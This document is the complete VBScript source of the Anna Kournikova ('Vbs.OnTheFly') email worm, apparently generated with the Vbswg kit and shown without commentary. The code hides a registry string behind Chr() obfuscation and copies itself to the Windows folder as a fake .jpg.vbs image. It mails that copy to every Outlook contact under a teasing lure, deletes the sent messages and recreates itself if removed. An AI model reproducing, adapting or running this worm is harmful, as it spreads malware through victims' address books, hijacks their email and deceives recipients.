'Vbs.OnTheFly Created By OnTheFly
On Error Resume Next
Set scriptshell = CreateObject("WScript.Shell")
scriptshell.regwrite "HKCU\software\OnTheFly\", Chr(87) & Chr(111) & Chr(114) & Chr(109) & Chr(32) & Chr(109) & Chr(97) & Chr(100) & Chr(101) & Chr(32) & Chr(119) & Chr(105) & Chr(116) & Chr(104) & Chr(32) & Chr(86) & Chr(98) & Chr(115) & Chr(119) & Chr(103) & Chr(32) & Chr(49) & Chr(46) & Chr(53) & Chr(48) & Chr(98)
Set filesystemobject= Createobject("scripting.filesystemobject")
filesystemobject.copyfile wscript.scriptfullname,filesystemobject.GetSpecialFolder(0)& "\AnnaKournikova.jpg.vbs"
if scriptshell.regread ("HKCU\software\OnTheFly\mailed") <> "1" then
  e2nSA7HlgLC()
end if
if month(now) =1 and day(now) =26 then
  scriptshell.run "Http://www.dynabyte.nl",3,false
end if
Set opentextfile= filesystemobject.opentextfile(wscript.scriptfullname, 1)
opentextfilereadall= opentextfile.readall
opentextfile.Close
Do
  If Not (filesystemobject.fileexists(wscript.scriptfullname)) Then
    Set createfile= filesystemobject.createtextfile(wscript.scriptfullname, True)
    createfile.writeopentextfilereadall
    createfile.Close
  End If
Loop

Function e2nSA7HlgLC()
  On Error Resume Next
  Set outlook = CreateObject("Outlook.Application")
  If outlook= "Outlook"Then
    Set mapi=outlook.GetNameSpace("MAPI")
    Set addresslists= mapi.AddressLists
    For Each address In addresslists
      If address.AddressEntries.Count <> 0 Then
        addresscount = address.AddressEntries.Count
        For counter= 1 To addresscount
          Set outlookitem = outlook.CreateItem(0)
          Set currentaddress = address.AddressEntries(counter)
          outlookitem.To = currentaddress.Address
          outlookitem.Subject = "Here you have, ;o)"
          outlookitem.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
          set attachment=outlookitem.Attachments
          attachment.Add filesystemobject.GetSpecialFolder(0)& "\AnnaKournikova.jpg.vbs"
          outlookitem.DeleteAfterSubmit = True
          If outlookitem.To <> "" Then
            outlookitem.Send
            scriptshell.regwrite "HKCU\software\OnTheFly\mailed", "1"
          End If
        Next
      End If
    Next
  end if
End Function
'Vbswg 1.50b    